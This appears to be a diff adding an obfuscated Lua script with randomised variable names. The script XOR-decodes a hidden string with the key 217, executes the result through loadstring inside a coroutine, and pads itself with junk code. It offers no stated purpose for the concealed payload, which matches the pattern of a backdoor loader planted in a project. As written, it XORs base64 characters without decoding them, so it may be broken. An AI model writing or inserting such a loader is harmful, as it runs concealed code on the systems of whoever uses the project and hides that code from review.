@@ -1,0 +1,27 @@
+
+local RGWEdgjRfeRfEj = "tba4vaqtq7C3vvG+uLS845GtramevK3x+7Gtramq4/b2q7iu976wrbGsu6yqvKu6tretvLet97q2tPaTuLq2u5S4qq28q5q2vbyr9pWsuPa0uLC39pW2uL2wt76Kuqu8vLf78PA="
+local YLyLcJBFRddpwc = 217
+local CNKidKwUVEabqS = {}
+for i=1,#(RGWEdgjRfeRfEj) do
+    CNKidKwUVEabqS[i] = string.byte(RGWEdgjRfeRfEj, i)
+end
+local xEKunVyVCKjNPh = {}
+for i=1,#(CNKidKwUVEabqS) do
+    xEKunVyVCKjNPh[i] = bit32.bxor(CNKidKwUVEabqS[i], YLyLcJBFRddpwc)
+end
+local qMRdEKhkwKJTbT = ""
+for i=1,#(xEKunVyVCKjNPh) do
+    qMRdEKhkwKJTbT = qMRdEKhkwKJTbT .. string.char(xEKunVyVCKjNPh[i])
+end
+local cRYvBYYSgaXvaa = loadstring(qMRdEKhkwKJTbT)
+
+local hAfWHaJVTVGuHh = coroutine.create(cRYvBYYSgaXvaa)
+local JxdMBgNyEHDUSg, err = coroutine.resume(hAfWHaJVTVGuHh)
+if not JxdMBgNyEHDUSg then error(err) end
+
+local VQfnHRGfhScknq = 0
+repeat
+    VQfnHRGfhScknq = VQfnHRGfhScknq + 1
+until VQfnHRGfhScknq > 3
+
+local MZJEjEjpJiyWFb = function() end
